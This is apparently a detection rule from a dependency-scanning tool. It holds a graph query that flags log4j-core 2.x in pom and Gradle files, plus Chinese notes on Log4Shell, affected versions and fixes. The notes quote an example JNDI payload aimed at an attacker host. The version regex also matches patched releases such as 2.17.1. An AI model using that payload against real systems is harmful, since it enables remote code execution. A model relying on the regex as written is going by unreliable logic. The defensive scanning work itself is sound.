// pom 的版本号可能是放在 properties标签里的， dependence标签里使用${xxx.version} 的方式引入
// 所以 sink点的version 是 ${xxx.version} ，而 realVersion才是真实的版本号
MATCH
  (sinkNode:PomDependency|GradleDependency)
  WHERE
  sinkNode.groupId = 'org.apache.logging.log4j' AND   sinkNode.artifactId = 'log4j-core' AND   sinkNode.
    realVersion =~ '2\\.(1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17).*'
RETURN
  sinkNode AS path

/*
Chanzi-Separator

Log4j远程代码执行

Log4j 安全漏洞，特别是被称为 "Log4Shell" 的漏洞（CVE-2021-44228），是一个严重的远程代码执行（RCE）漏洞。这个漏洞存在于 Apache Log4j 2 的某些版本中，主要是因为 Log4j2 处理 Java 命名和目录接口（JNDI）查询的方式存在缺陷。

基本原理：

    Log4j2 支持一个名为 Lookup 的功能，它允许开发者在日志消息中使用变量，这些变量可以是系统属性、环境变量或其他外部定义的值。
    攻击者可以利用 Lookup 功能，通过构造特殊的日志消息，使得 Log4j2 解析并执行恶意的 JNDI 查找。
    JNDI 查找可以指向一个远程服务器，该服务器返回一个对象，Log4j2 会尝试将这个对象反序列化。
    如果攻击者控制了远程服务器，他们可以返回一个包含恶意代码的对象，当 Log4j2 反序列化这个对象时，恶意代码就会被执行。

受影响的版本：

    Log4j反序列化漏洞影响的版本如下：
    1. Apache Log4j 1.2版本：CVE-2019-17571，影响Apache Log4j 1.2.27及之前版本。官方已于2015年8月停止维护1.2版本，建议升级到2.8.2或更高版本。
    2. Apache Log4j 2.x版本：CVE-2021-44228，影响Apache Log4j 2.x版本在2.15.0之前的所有版本。最直接、有效、稳定的修复方式是将log4j-core升级到2.15.0版本。
    3. Apache Log4j 2.x版本：CVE-2017-5645，影响Apache Log4j 2.x版本在2.8.2之前的所有版本。
    4. Apache Log4j 1.x和Apache Chainsaw：CVE-2022-23302、CVE-2022-23305、CVE-2022-23307，影响Apache Log4j 1.x和Apache Chainsaw < 2.1.0。
    综上所述，Log4j反序列化漏洞主要影响Apache Log4j 1.x系列和2.x系列在特定版本之前的版本。建议用户根据官方的安全通告，升级到不受漏洞影响的安全版本，以确保系统的安全性，建议至少升级到2.17.1以上版本。

攻击方式：

    攻击者可以通过在日志消息中嵌入恶意的 JNDI 查找，例如 ${jndi:ldap://attacker-hostname/exploit}，来触发远程代码执行。
    这个漏洞可以被利用来执行任意代码，包括下载和执行恶意软件、窃取数据、或者在受影响的系统上建立持久性。

Chanzi-Separator

Log4j 安全漏洞的修复方案主要包括以下几个步骤：

    升级 Log4j 版本：最直接和有效的修复方式是将 Log4j 升级到最新的安全版本。截至目前，建议升级到 Log4j 2.17.1 以上版本，以确保所有已知漏洞都已被修复。另外 log4j 是一个被广泛依赖的组件，通常需要在升级过程中确认系统中所有直接或间接依赖都得到有效的升级。

    禁用 Lookup 功能：对于无法立即升级的系统，可以通过设置系统属性 log4j2.formatMsgNoLookups=true 来禁用 Log4j 的 Lookup 功能，从而降低漏洞的可利用性。这可以通过 JVM 启动参数 -Dlog4j2.formatMsgNoLookups=true 实现，或者在应用的 classpath 下添加 log4j2.component.properties 配置文件，并设置 log4j2.formatMsgNoLookups=true。

    删除 JndiLookup 类：另一种修复方法是从 log4j-core jar 包中删除 JndiLookup 类。这可以通过命令 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 来完成。

    限制 JNDI 访问：可以通过配置来限制 JNDI 查找，只允许访问本地主机上提供的 Java 原始对象，从而减少远程代码执行的风险。

    使用防火墙和安全产品：部署使用第三方防火墙产品进行安全防护，并更新 WAF（Web 应用防火墙）、RASP（运行时应用自我保护）规则等，以防止潜在的攻击。

    监控和排查：监控系统日志和网络流量，排查可能的攻击行为，如异常的 JNDI 访问尝试。

    应用安全最佳实践：确保所有流量都通过适当的安全措施，如 WAF/IPS，限制可以到达易受攻击系统的流量，并减少主机的授权传出流量。

请注意，这些修复建议是基于当前可用的信息，并且可能随着时间的推移而更新。始终建议关注官方的安全公告和更新日志，以获取最新的安全信息和修复建议。

Chanzi-Separator
*/